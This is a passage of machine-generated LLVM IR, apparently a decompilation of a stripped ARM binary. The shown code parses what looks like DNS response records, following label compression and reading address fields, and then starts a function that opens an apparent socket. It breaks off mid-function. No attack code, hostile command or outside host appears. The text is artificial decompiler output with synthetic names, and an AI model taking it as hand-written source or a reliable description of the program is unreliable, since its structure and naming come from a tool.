  %v3_e6bc20 = zext i8 %v2_e6bc19 to i32
  store i32 %v3_e6bc20, i32* %r2.global-to-local, align 4
  %v2_e6c021 = icmp eq i8 %v2_e6bc19, 0
  store i1 %v2_e6c021, i1* %cpsr_z.global-to-local, align 1
  %v3_e6c422 = mul nuw nsw i32 %v3_e6bc20, 256
  store i32 %v3_e6c422, i32* %r1.global-to-local, align 4
  br i1 %v2_e6c021, label %dec_label_pc_e6f8, label %dec_label_pc_e6cc.preheader

dec_label_pc_e6cc.preheader:                      ; preds = %dec_label_pc_e6b0, %dec_label_pc_e6bc.backedge
  %v1_e798 = phi i32 [ %v1_e79850, %dec_label_pc_e6bc.backedge ], [ 1, %dec_label_pc_e6b0 ]
  %v0_e79048 = phi i32 [ %v0_e790, %dec_label_pc_e6bc.backedge ], [ 0, %dec_label_pc_e6b0 ]
  %v0_e6d846 = phi i32 [ %v3_e6c4, %dec_label_pc_e6bc.backedge ], [ %v3_e6c422, %dec_label_pc_e6b0 ]
  %v0_e6d444 = phi i32 [ %v1_e794, %dec_label_pc_e6bc.backedge ], [ %v0_e700143, %dec_label_pc_e6b0 ]
  %v0_e6cc42 = phi i32 [ %v3_e6bc, %dec_label_pc_e6bc.backedge ], [ %v3_e6bc20, %dec_label_pc_e6b0 ]
  br label %dec_label_pc_e6cc

dec_label_pc_e6cc:                                ; preds = %dec_label_pc_e6cc.preheader, %dec_label_pc_e6d4
  %v0_e790 = phi i32 [ %v0_e79048, %dec_label_pc_e6cc.preheader ], [ 1, %dec_label_pc_e6d4 ]
  %v0_e6d8 = phi i32 [ %v0_e6d846, %dec_label_pc_e6cc.preheader ], [ %v3_e6f0, %dec_label_pc_e6d4 ]
  %v0_e794 = phi i32 [ %v0_e6d444, %dec_label_pc_e6cc.preheader ], [ %v2_e6e0, %dec_label_pc_e6d4 ]
  %v0_e6cc = phi i32 [ %v0_e6cc42, %dec_label_pc_e6cc.preheader ], [ %v3_e6e4, %dec_label_pc_e6d4 ]
  %v7_e6cc = icmp eq i32 %v0_e6cc, 191
  store i1 %v7_e6cc, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v0_e6cc, 192
  br i1 %tmp, label %dec_label_pc_e790, label %dec_label_pc_e6d4

dec_label_pc_e6d4:                                ; preds = %dec_label_pc_e6cc
  %v1_e6d4 = add i32 %v0_e794, 1
  %v2_e6d4 = inttoptr i32 %v1_e6d4 to i8*
  %v3_e6d4 = load i8, i8* %v2_e6d4, align 1
  %v4_e6d4 = zext i8 %v3_e6d4 to i32
  %v2_e6d8 = or i32 %v4_e6d4, -49152
  %v0_e6e0 = load i32, i32* @r5, align 4
  %v1_e6dc = add i32 %v0_e6e0, %v0_e6d8
  %v2_e6e0 = add i32 %v1_e6dc, %v2_e6d8
  store i32 %v2_e6e0, i32* %r3.global-to-local, align 4
  %v1_e6e4 = inttoptr i32 %v2_e6e0 to i8*
  %v2_e6e4 = load i8, i8* %v1_e6e4, align 1
  %v3_e6e4 = zext i8 %v2_e6e4 to i32
  store i32 %v3_e6e4, i32* %r2.global-to-local, align 4
  %v2_e6e8 = icmp eq i8 %v2_e6e4, 0
  store i1 %v2_e6e8, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* @ip, align 4
  %v3_e6f0 = mul nuw nsw i32 %v3_e6e4, 256
  store i32 %v3_e6f0, i32* %r1.global-to-local, align 4
  br i1 %v2_e6e8, label %dec_label_pc_e6f8, label %dec_label_pc_e6cc

dec_label_pc_e6f8:                                ; preds = %dec_label_pc_e6bc.backedge, %dec_label_pc_e6d4, %dec_label_pc_e6b0
  %v1_e6fc = phi i32 [ 1, %dec_label_pc_e6b0 ], [ %v1_e798, %dec_label_pc_e6d4 ], [ %v1_e79850, %dec_label_pc_e6bc.backedge ]
  %v0_e6f8 = phi i32 [ 0, %dec_label_pc_e6b0 ], [ 1, %dec_label_pc_e6d4 ], [ %v0_e790, %dec_label_pc_e6bc.backedge ]
  %v7_e6f8 = icmp eq i32 %v0_e6f8, 1
  store i1 %v7_e6f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e6f8, label %bb119, label %bb120

bb119:                                            ; preds = %dec_label_pc_e6f8
  %v2_e6fc = add i32 %v1_e6fc, 1
  store i32 %v2_e6fc, i32* @lr, align 4
  br label %bb120

bb120:                                            ; preds = %dec_label_pc_e6f8, %bb119
  %v1_e700 = phi i32 [ %v1_e6fc, %dec_label_pc_e6f8 ], [ %v2_e6fc, %bb119 ]
  %v2_e700 = add i32 %v1_e700, %v0_e700143
  store i32 %v2_e700, i32* @r4, align 4
  %v3_e704 = inttoptr i32 %v2_e700 to i8*
  %v4_e704 = load i8, i8* %v3_e704, align 1
  %v6_e704 = zext i8 %v4_e704 to i32
  store i32 %v6_e704, i32* %r3.global-to-local, align 4
  %v1_e708 = add i32 %v2_e700, 1
  %v2_e708 = inttoptr i32 %v1_e708 to i8*
  %v3_e708 = load i8, i8* %v2_e708, align 1
  %v4_e708 = zext i8 %v3_e708 to i32
  store i32 %v4_e708, i32* %r2.global-to-local, align 4
  %v4_e70c = mul nuw nsw i32 %v4_e708, 256
  %v5_e70c = or i32 %v4_e70c, %v6_e704
  store i32 %v5_e70c, i32* %r3.global-to-local, align 4
  %v7_e710 = icmp eq i32 %v5_e70c, 256
  store i1 %v7_e710, i1* %cpsr_z.global-to-local, align 1
  %v1_e714 = add i32 %v2_e700, 10
  store i32 %v1_e714, i32* @r6, align 4
  br i1 %v7_e710, label %dec_label_pc_e7b0, label %dec_label_pc_e71c

dec_label_pc_e71c:                                ; preds = %dec_label_pc_e7b0, %bb120
  store i32 %v1_e714, i32* %r3.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_e72824 = inttoptr i32 %v1_e714 to i8*
  %v2_e72825 = load i8, i8* %v1_e72824, align 1
  %v3_e72826 = zext i8 %v2_e72825 to i32
  store i32 %v3_e72826, i32* %r2.global-to-local, align 4
  %v2_e72c27 = icmp eq i8 %v2_e72825, 0
  store i1 %v2_e72c27, i1* %cpsr_z.global-to-local, align 1
  %v3_e73028 = mul nuw nsw i32 %v3_e72826, 256
  store i32 %v3_e73028, i32* %r1.global-to-local, align 4
  br i1 %v2_e72c27, label %dec_label_pc_e764, label %dec_label_pc_e738.preheader

dec_label_pc_e738.preheader:                      ; preds = %dec_label_pc_e71c, %dec_label_pc_e728.backedge
  %v1_e7a8 = phi i32 [ %v1_e7a865, %dec_label_pc_e728.backedge ], [ 1, %dec_label_pc_e71c ]
  %v0_e7a063 = phi i32 [ %v0_e7a0, %dec_label_pc_e728.backedge ], [ 0, %dec_label_pc_e71c ]
  %v0_e74461 = phi i32 [ %v3_e730, %dec_label_pc_e728.backedge ], [ %v3_e73028, %dec_label_pc_e71c ]
  %v0_e74059 = phi i32 [ %v1_e7a4, %dec_label_pc_e728.backedge ], [ %v1_e714, %dec_label_pc_e71c ]
  %v0_e73857 = phi i32 [ %v3_e728, %dec_label_pc_e728.backedge ], [ %v3_e72826, %dec_label_pc_e71c ]
  br label %dec_label_pc_e738

dec_label_pc_e738:                                ; preds = %dec_label_pc_e738.preheader, %dec_label_pc_e740
  %v0_e7a0 = phi i32 [ %v0_e7a063, %dec_label_pc_e738.preheader ], [ 1, %dec_label_pc_e740 ]
  %v0_e744 = phi i32 [ %v0_e74461, %dec_label_pc_e738.preheader ], [ %v3_e75c, %dec_label_pc_e740 ]
  %v0_e7a4 = phi i32 [ %v0_e74059, %dec_label_pc_e738.preheader ], [ %v2_e74c, %dec_label_pc_e740 ]
  %v0_e738 = phi i32 [ %v0_e73857, %dec_label_pc_e738.preheader ], [ %v3_e750, %dec_label_pc_e740 ]
  %v7_e738 = icmp eq i32 %v0_e738, 191
  store i1 %v7_e738, i1* %cpsr_z.global-to-local, align 1
  %tmp159 = icmp ult i32 %v0_e738, 192
  br i1 %tmp159, label %dec_label_pc_e7a0, label %dec_label_pc_e740

dec_label_pc_e740:                                ; preds = %dec_label_pc_e738
  %v1_e740 = add i32 %v0_e7a4, 1
  %v2_e740 = inttoptr i32 %v1_e740 to i8*
  %v3_e740 = load i8, i8* %v2_e740, align 1
  %v4_e740 = zext i8 %v3_e740 to i32
  %v2_e744 = or i32 %v4_e740, -49152
  %v0_e74c = load i32, i32* @r5, align 4
  %v1_e748 = add i32 %v0_e74c, %v0_e744
  %v2_e74c = add i32 %v1_e748, %v2_e744
  store i32 %v2_e74c, i32* %r3.global-to-local, align 4
  %v1_e750 = inttoptr i32 %v2_e74c to i8*
  %v2_e750 = load i8, i8* %v1_e750, align 1
  %v3_e750 = zext i8 %v2_e750 to i32
  store i32 %v3_e750, i32* %r2.global-to-local, align 4
  %v2_e754 = icmp eq i8 %v2_e750, 0
  store i1 %v2_e754, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* @ip, align 4
  %v3_e75c = mul nuw nsw i32 %v3_e750, 256
  store i32 %v3_e75c, i32* %r1.global-to-local, align 4
  br i1 %v2_e754, label %dec_label_pc_e764, label %dec_label_pc_e738

dec_label_pc_e764:                                ; preds = %dec_label_pc_e728.backedge, %dec_label_pc_e740, %dec_label_pc_e71c
  %v1_e768 = phi i32 [ 1, %dec_label_pc_e71c ], [ %v1_e7a8, %dec_label_pc_e740 ], [ %v1_e7a865, %dec_label_pc_e728.backedge ]
  %v0_e764 = phi i32 [ 0, %dec_label_pc_e71c ], [ 1, %dec_label_pc_e740 ], [ %v0_e7a0, %dec_label_pc_e728.backedge ]
  %v7_e764 = icmp eq i32 %v0_e764, 1
  store i1 %v7_e764, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e764, label %bb121, label %bb122

bb121:                                            ; preds = %dec_label_pc_e764
  %v2_e768 = add i32 %v1_e768, 1
  store i32 %v2_e768, i32* %r0.global-to-local, align 4
  br label %bb122

bb122:                                            ; preds = %dec_label_pc_e7c4, %dec_label_pc_e764, %bb121
  %v1_e76c = phi i32 [ %v5_e7dc, %dec_label_pc_e7c4 ], [ %v1_e768, %dec_label_pc_e764 ], [ %v2_e768, %bb121 ]
  %v2_e76c = add i32 %v1_e76c, %v1_e714
  br label %dec_label_pc_e69c.backedge

dec_label_pc_e69c.backedge:                       ; preds = %bb122, %dec_label_pc_e7e8
  %v0_e69c.pre = phi i32 [ %v3_e6a8144, %bb122 ], [ %v0_e69c.pre.pre, %dec_label_pc_e7e8 ]
  %storemerge29 = phi i32 [ %v2_e76c, %bb122 ], [ %v2_e860, %dec_label_pc_e7e8 ]
  store i32 %storemerge29, i32* %r0.global-to-local, align 4
  %v1_e69c = add i32 %v0_e69c.pre, -1
  %v3_e6a0 = mul i32 %v1_e69c, 65536
  store i32 %v3_e6a0, i32* %r3.global-to-local, align 4
  %v7_e6a4 = icmp eq i32 %v3_e6a0, -65536
  store i1 %v7_e6a4, i1* %cpsr_z.global-to-local, align 1
  %v3_e6a8 = urem i32 %v1_e69c, 65536
  store i32 %v3_e6a8, i32* @r8, align 4
  br i1 %v7_e6a4, label %dec_label_pc_e624, label %dec_label_pc_e6b0

dec_label_pc_e774:                                ; preds = %dec_label_pc_e624
  %v1_e774 = add i32 %v0_e62c, 4
  %v2_e774 = inttoptr i32 %v1_e774 to i32*
  %v3_e774 = load i32, i32* %v2_e774, align 4
  store i32 %v3_e774, i32* %r0.global-to-local, align 4
  %v2_e778 = icmp eq i32 %v3_e774, 0
  store i1 %v2_e778, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_e780.120 to i32), i32* @lr, align 4
  %v1_e77c = xor i1 %v2_e778, true
  call void @__pseudo_cond_branch(i1 %v1_e77c, i32 ptrtoint (i32* @global_var_12da0.21 to i32))
  %v0_e780 = load i32, i32* @fp, align 4
  store i32 %v0_e780, i32* @r0, align 4
  %v0_e784 = call i32 @function_12da0()
  store i32 %v0_e784, i32* %r0.global-to-local, align 4
  %v0_e788 = load i32, i32* @r4, align 4
  br label %dec_label_pc_e638

dec_label_pc_e790:                                ; preds = %dec_label_pc_e6cc
  %v2_e790 = icmp eq i32 %v0_e790, 0
  store i1 %v2_e790, i1* %cpsr_z.global-to-local, align 1
  %v1_e794 = add i32 %v0_e794, 1
  store i32 %v1_e794, i32* %r3.global-to-local, align 4
  br i1 %v2_e790, label %bb123, label %dec_label_pc_e6bc.backedge

dec_label_pc_e6bc.backedge:                       ; preds = %dec_label_pc_e790, %bb123
  %v1_e79850 = phi i32 [ %v1_e798, %dec_label_pc_e790 ], [ %v2_e798, %bb123 ]
  %v1_e6bc = inttoptr i32 %v1_e794 to i8*
  %v2_e6bc = load i8, i8* %v1_e6bc, align 1
  %v3_e6bc = zext i8 %v2_e6bc to i32
  store i32 %v3_e6bc, i32* %r2.global-to-local, align 4
  %v2_e6c0 = icmp eq i8 %v2_e6bc, 0
  store i1 %v2_e6c0, i1* %cpsr_z.global-to-local, align 1
  %v3_e6c4 = mul nuw nsw i32 %v3_e6bc, 256
  store i32 %v3_e6c4, i32* %r1.global-to-local, align 4
  br i1 %v2_e6c0, label %dec_label_pc_e6f8, label %dec_label_pc_e6cc.preheader

bb123:                                            ; preds = %dec_label_pc_e790
  %v2_e798 = add i32 %v1_e798, 1
  store i32 %v2_e798, i32* @lr, align 4
  br label %dec_label_pc_e6bc.backedge

dec_label_pc_e7a0:                                ; preds = %dec_label_pc_e738
  %v2_e7a0 = icmp eq i32 %v0_e7a0, 0
  store i1 %v2_e7a0, i1* %cpsr_z.global-to-local, align 1
  %v1_e7a4 = add i32 %v0_e7a4, 1
  store i32 %v1_e7a4, i32* %r3.global-to-local, align 4
  br i1 %v2_e7a0, label %bb124, label %dec_label_pc_e728.backedge

dec_label_pc_e728.backedge:                       ; preds = %dec_label_pc_e7a0, %bb124
  %v1_e7a865 = phi i32 [ %v1_e7a8, %dec_label_pc_e7a0 ], [ %v2_e7a8, %bb124 ]
  %v1_e728 = inttoptr i32 %v1_e7a4 to i8*
  %v2_e728 = load i8, i8* %v1_e728, align 1
  %v3_e728 = zext i8 %v2_e728 to i32
  store i32 %v3_e728, i32* %r2.global-to-local, align 4
  %v2_e72c = icmp eq i8 %v2_e728, 0
  store i1 %v2_e72c, i1* %cpsr_z.global-to-local, align 1
  %v3_e730 = mul nuw nsw i32 %v3_e728, 256
  store i32 %v3_e730, i32* %r1.global-to-local, align 4
  br i1 %v2_e72c, label %dec_label_pc_e764, label %dec_label_pc_e738.preheader

bb124:                                            ; preds = %dec_label_pc_e7a0
  %v2_e7a8 = add i32 %v1_e7a8, 1
  store i32 %v2_e7a8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e728.backedge

dec_label_pc_e7b0:                                ; preds = %bb120
  %v1_e7b0 = add i32 %v2_e700, 2
  %v2_e7b0 = inttoptr i32 %v1_e7b0 to i8*
  %v3_e7b0 = load i8, i8* %v2_e7b0, align 1
  %v4_e7b0 = zext i8 %v3_e7b0 to i32
  store i32 %v4_e7b0, i32* %r3.global-to-local, align 4
  %v1_e7b4 = add i32 %v2_e700, 3
  %v2_e7b4 = inttoptr i32 %v1_e7b4 to i8*
  %v3_e7b4 = load i8, i8* %v2_e7b4, align 1
  %v4_e7b4 = zext i8 %v3_e7b4 to i32
  store i32 %v4_e7b4, i32* %r2.global-to-local, align 4
  %v4_e7b8 = mul nuw nsw i32 %v4_e7b4, 256
  %v5_e7b8 = or i32 %v4_e7b8, %v4_e7b0
  store i32 %v5_e7b8, i32* %r3.global-to-local, align 4
  %v7_e7bc = icmp eq i32 %v5_e7b8, 256
  store i1 %v7_e7bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e7bc, label %dec_label_pc_e7c4, label %dec_label_pc_e71c

dec_label_pc_e7c4:                                ; preds = %dec_label_pc_e7b0
  %v1_e7c4 = add i32 %v2_e700, 9
  %v2_e7c4 = inttoptr i32 %v1_e7c4 to i8*
  %v3_e7c4 = load i8, i8* %v2_e7c4, align 1
  %v4_e7c4 = zext i8 %v3_e7c4 to i32
  store i32 %v4_e7c4, i32* %r2.global-to-local, align 4
  %v1_e7c8 = add i32 %v2_e700, 8
  %v2_e7c8 = inttoptr i32 %v1_e7c8 to i8*
  %v3_e7c8 = load i8, i8* %v2_e7c8, align 1
  %v4_e7c8 = zext i8 %v3_e7c8 to i32
  %v4_e7cc = mul nuw nsw i32 %v4_e7c4, 256
  %v5_e7cc = or i32 %v4_e7c8, %v4_e7cc
  %v3_e7d0 = mul i32 %v5_e7cc, 65536
  store i32 %v3_e7d0, i32* %r3.global-to-local, align 4
  %v3_e7d4 = mul nuw nsw i32 %v4_e7c8, 256
  store i32 %v3_e7d4, i32* %r2.global-to-local, align 4
  %v5_e7dc = or i32 %v3_e7d4, %v4_e7c4
  store i32 %v5_e7dc, i32* %r0.global-to-local, align 4
  %v7_e7e0 = icmp eq i32 %v5_e7dc, 4
  store i1 %v7_e7e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e7e0, label %dec_label_pc_e7e8, label %bb122

dec_label_pc_e7e8:                                ; preds = %dec_label_pc_e7c4
  %v2_e7e8 = inttoptr i32 %v1_e714 to i8*
  %v3_e7e8 = load i8, i8* %v2_e7e8, align 1
  %v4_e7e8 = zext i8 %v3_e7e8 to i32
  store i32 %v4_e7e8, i32* %r3.global-to-local, align 4
  store i32 %v2_e400, i32* %r2.global-to-local, align 4
  %v1_e7f4 = add i32 %v2_e700, 11
  %v2_e7f4 = inttoptr i32 %v1_e7f4 to i8*
  %v3_e7f4 = load i8, i8* %v2_e7f4, align 1
  %v4_e7f4 = zext i8 %v3_e7f4 to i32
  store i32 %v4_e7f4, i32* %r2.global-to-local, align 4
  store i32 %v2_e400, i32* %r3.global-to-local, align 4
  %v1_e800 = add i32 %v2_e700, 12
  %v2_e800 = inttoptr i32 %v1_e800 to i8*
  %v3_e800 = load i8, i8* %v2_e800, align 1
  %v4_e800 = zext i8 %v3_e800 to i32
  store i32 %v4_e800, i32* %r3.global-to-local, align 4
  store i32 %v2_e400, i32* @ip, align 4
  %v1_e80c = add i32 %v2_e700, 13
  %v2_e80c = inttoptr i32 %v1_e80c to i8*
  %v3_e80c = load i8, i8* %v2_e80c, align 1
  %v4_e80c = zext i8 %v3_e80c to i32
  store i32 %v4_e80c, i32* %r2.global-to-local, align 4
  %v0_e814 = load i32, i32* @fp, align 4
  %v1_e814 = inttoptr i32 %v0_e814 to i8*
  %v2_e814 = load i8, i8* %v1_e814, align 1
  %v3_e814 = zext i8 %v2_e814 to i32
  %v1_e818 = mul nuw nsw i32 %v3_e814, 4
  %v3_e81c = add nuw nsw i32 %v1_e818, 4
  store i32 %v3_e81c, i32* %r1.global-to-local, align 4
  %v1_e820 = add i32 %v0_e814, 4
  %v2_e820 = inttoptr i32 %v1_e820 to i32*
  %v3_e820 = load i32, i32* %v2_e820, align 4
  store i32 %v3_e820, i32* %r0.global-to-local, align 4
  %v3_e824 = sext i8 %v3_e80c to i32
  %v5_e824 = sext i8 %v3_e800 to i32
  %v10_e824 = inttoptr i32 %v3_e820 to i32*
  %v11_e824 = call i32 @function_12788(i32* %v10_e824, i32 %v3_e81c, i32 %v3_e824, i32 %v5_e824)
  store i32 %v11_e824, i32* %r0.global-to-local, align 4
  %v0_e828 = load i32, i32* @fp, align 4
  %v1_e828 = inttoptr i32 %v0_e828 to i8*
  %v2_e828 = load i8, i8* %v1_e828, align 1
  %v3_e828 = zext i8 %v2_e828 to i32
  store i32 %v3_e828, i32* %r2.global-to-local, align 4
  %v4_e830 = sext i8 %v3_e7e8 to i32
  store i32 %v4_e830, i32* %r3.global-to-local, align 4
  %v1_e834 = add nuw nsw i32 %v3_e828, 1
  store i32 %v1_e834, i32* %r1.global-to-local, align 4
  %v5_e838 = mul nuw nsw i32 %v3_e828, 4
  %v6_e838 = add i32 %v5_e838, %v11_e824
  %v7_e838 = inttoptr i32 %v6_e838 to i32*
  store i32 %v4_e830, i32* %v7_e838, align 4
  %v1_e83c = load i32, i32* @fp, align 4
  %v2_e83c = add i32 %v1_e83c, 4
  %v3_e83c = inttoptr i32 %v2_e83c to i32*
  store i32 %v11_e824, i32* %v3_e83c, align 4
  %v0_e840 = load i32, i32* %r1.global-to-local, align 4
  %v1_e840 = trunc i32 %v0_e840 to i8
  %v2_e840 = load i32, i32* @fp, align 4
  %v3_e840 = inttoptr i32 %v2_e840 to i8*
  store i8 %v1_e840, i8* %v3_e840, align 1
  %v0_e844 = load i32, i32* @r4, align 4
  %v1_e844 = add i32 %v0_e844, 9
  %v2_e844 = inttoptr i32 %v1_e844 to i8*
  %v3_e844 = load i8, i8* %v2_e844, align 1
  %v4_e844 = zext i8 %v3_e844 to i32
  store i32 %v4_e844, i32* %r3.global-to-local, align 4
  %v1_e848 = add i32 %v0_e844, 8
  %v2_e848 = inttoptr i32 %v1_e848 to i8*
  %v3_e848 = load i8, i8* %v2_e848, align 1
  %v4_e848 = zext i8 %v3_e848 to i32
  %v4_e84c = mul nuw nsw i32 %v4_e844, 256
  %v5_e84c = or i32 %v4_e848, %v4_e84c
  %v3_e850 = mul i32 %v5_e84c, 65536
  store i32 %v3_e850, i32* %r2.global-to-local, align 4
  %v3_e854 = mul nuw nsw i32 %v4_e848, 256
  store i32 %v3_e854, i32* %r3.global-to-local, align 4
  %v5_e85c = or i32 %v3_e854, %v4_e844
  store i32 %v5_e85c, i32* %r0.global-to-local, align 4
  %v0_e860 = load i32, i32* @r6, align 4
  %v2_e860 = add i32 %v0_e860, %v5_e85c
  %v0_e69c.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_e69c.backedge

; uselistorder directives
  uselistorder i32 %v3_e854, { 1, 0 }
  uselistorder i32 %v4_e844, { 1, 0, 2 }
  uselistorder i32 %v11_e824, { 1, 0, 2 }
  uselistorder i32 %v3_e81c, { 1, 0 }
  uselistorder i32 %v5_e7dc, { 1, 2, 0 }
  uselistorder i32 %v3_e7d4, { 1, 0 }
  uselistorder i32 %v4_e7c4, { 1, 0, 2 }
  uselistorder i32 %v2_e7a8, { 1, 0 }
  uselistorder i32 %v3_e728, { 0, 2, 1 }
  uselistorder i32 %v1_e7a865, { 1, 0 }
  uselistorder i32 %v1_e7a4, { 1, 2, 0 }
  uselistorder i32 %v2_e798, { 1, 0 }
  uselistorder i32 %v3_e6bc, { 0, 2, 1 }
  uselistorder i32 %v1_e79850, { 1, 0 }
  uselistorder i32 %v1_e794, { 1, 2, 0 }
  uselistorder i1 %v7_e6a4, { 1, 0 }
  uselistorder i32 %v1_e69c, { 1, 0 }
  uselistorder i32 %storemerge29, { 1, 0 }
  uselistorder i32 %v3_e750, { 0, 2, 1 }
  uselistorder i32 %v2_e74c, { 1, 2, 0 }
  uselistorder i32 %v0_e7a0, { 2, 0, 1 }
  uselistorder i32 %v1_e7a8, { 1, 2, 0 }
  uselistorder i32 %v3_e73028, { 1, 0 }
  uselistorder i32 %v3_e72826, { 1, 0, 2 }
  uselistorder i32 %v1_e714, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32 %v2_e700, { 0, 1, 2, 4, 3, 6, 5, 7, 9, 8, 10 }
  uselistorder i32 %v3_e6e4, { 0, 2, 1 }
  uselistorder i32 %v2_e6e0, { 1, 2, 0 }
  uselistorder i32 %v0_e790, { 2, 0, 1 }
  uselistorder i32 %v1_e798, { 1, 2, 0 }
  uselistorder i32 %v3_e6c422, { 1, 0 }
  uselistorder i32 %v3_e6bc20, { 1, 0, 2 }
  uselistorder i32 %v0_e700143, { 3, 0, 1, 2 }
  uselistorder i32 %v3_e6a8142, { 1, 0 }
  uselistorder i1 %v7_e6a4141, { 1, 0 }
  uselistorder i32 %v1_e69c134, { 1, 0 }
  uselistorder i1 %v9_e678, { 1, 0 }
  uselistorder i32 %v0_e638, { 1, 0 }
  uselistorder i32 %v0_e62c, { 1, 0, 2 }
  uselistorder i32 %v0_e61c, { 1, 0 }
  uselistorder i32 %v0_e5f4, { 1, 0 }
  uselistorder i1 %v7_e5a8, { 1, 0 }
  uselistorder i32 %v1_e56c, { 1, 0 }
  uselistorder i32 %v3_e558, { 1, 0 }
  uselistorder i32 %v0_e550, { 1, 0 }
  uselistorder i32 %v1_e544, { 1, 2, 0 }
  uselistorder i1 %v7_e4fc, { 1, 0 }
  uselistorder i32 %v4_e4f8, { 1, 0, 2 }
  uselistorder i1 %v7_e4e0, { 1, 0 }
  uselistorder i32 %v3_e4dc, { 1, 0, 2 }
  uselistorder i1 %v7_e4c4, { 1, 0 }
  uselistorder i32 %v3_e4c0, { 2, 1, 0, 3 }
  uselistorder i1 %v7_e4a8, { 2, 1, 0 }
  uselistorder i32 %v1_e4ac, { 1, 0 }
  uselistorder i32 %v2_e534, { 1, 0, 2 }
  uselistorder i16 %v5_e450, { 1, 0 }
  uselistorder i32 %v2_e44c, { 1, 0, 2 }
  uselistorder i32 %v6_e438, { 1, 2, 0 }
  uselistorder i64 %v5_e434, { 0, 2, 1 }
  uselistorder i32 %v1_e420, { 1, 0, 2 }
  uselistorder i32 %v1_e3d8, { 1, 0 }
  uselistorder i32 %v1_e3d4, { 1, 2, 0 }
  uselistorder i32 %v2_e3d0, { 1, 0 }
  uselistorder i1 %v8_e3bc, { 1, 0 }
  uselistorder i32 %v2_e394, { 1, 0, 2 }
  uselistorder i16* %stack_var_-2244, { 1, 0 }
  uselistorder i32* %stack_var_-68, { 0, 2, 1 }
  uselistorder i16* %stack_var_-4292, { 1, 0 }
  uselistorder i16 %tmp79, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 16, 11, 14, 12, 13, 15, 17, 35, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 34, 32, 33, 36 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 11, 14, 10, 1, 12, 13, 0, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 6, 8, 5, 1, 7, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 22, 21, 23, 20 }
  uselistorder i32* %r0.global-to-local, { 1, 5, 2, 3, 4, 11, 6, 8, 7, 9, 10, 12, 15, 13, 14, 17, 16, 20, 18, 19, 21, 22, 41, 23, 25, 24, 26, 28, 27, 29, 32, 31, 30, 33, 34, 35, 36, 37, 38, 39, 40, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 3, 10, 4, 15, 5, 6, 16, 7, 8, 9, 1, 11, 12, 13, 14, 0, 35, 17, 18, 19, 20, 21, 22, 23, 24, 34, 25, 26, 27, 28, 33, 30, 31, 29, 32, 36 }
  uselistorder i32 (i32)* @function_133f8, { 7, 6, 11, 10, 9, 8, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_e728.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_e6bc.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_e69c.backedge, { 1, 0 }
  uselistorder label %bb122, { 0, 2, 1 }
  uselistorder label %dec_label_pc_e738, { 1, 0 }
  uselistorder label %dec_label_pc_e738.preheader, { 1, 0 }
  uselistorder label %bb120, { 1, 0 }
  uselistorder label %dec_label_pc_e6cc, { 1, 0 }
  uselistorder label %dec_label_pc_e6cc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_e6b0, { 1, 0 }
  uselistorder label %dec_label_pc_e638, { 1, 0 }
  uselistorder label %dec_label_pc_e624, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_e604, { 2, 1, 4, 0, 3 }
  uselistorder label %bb118, { 1, 0 }
  uselistorder label %bb115, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_e3b4, { 1, 0 }
}

define i32 @function_e868() local_unnamed_addr {
dec_label_pc_e868:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e868 = load i32, i32* @r4, align 4
  store i32 %v3_e868, i32* %stack_var_-16, align 4
  %v12_e868 = load i32, i32* @lr, align 4
  %v0_e86c = load i32, i32* @r0, align 4
  store i32 %v0_e86c, i32* %r5.global-to-local, align 4
  %v1_e870 = add i32 %v0_e86c, 4
  %v2_e870 = inttoptr i32 %v1_e870 to i32*
  %v3_e870 = load i32, i32* %v2_e870, align 4
  store i32 %v3_e870, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i32 59540, i32* @lr, align 4
  %v1_e890 = icmp ne i32 %v3_e870, -1
  call void @__pseudo_cond_branch(i1 %v1_e890, i32 ptrtoint (i32* @global_var_1130c.96 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_e8a0 = call i32 @function_11aec(i32 2, i32 1, i32 0)
  store i32 %v3_e8a0, i32* %r0.global-to-local, align 4
  %v7_e8a4 = icmp eq i32 %v3_e8a0, -1
  %v1_e8a8 = load i32, i32* %r5.global-to-local, align 4
  %v2_e8a8 = add i32 %v1_e8a8, 4
  %v3_e8a8 = inttoptr i32 %v2_e8a8 to i32*
  store i32 %v3_e8a0, i32* %v3_e8a8, align 4
  br i1 %v7_e8a4, label %dec_label_pc_e868.dec_label_pc_e920_crit_edge, label %dec_label_pc_e8b0

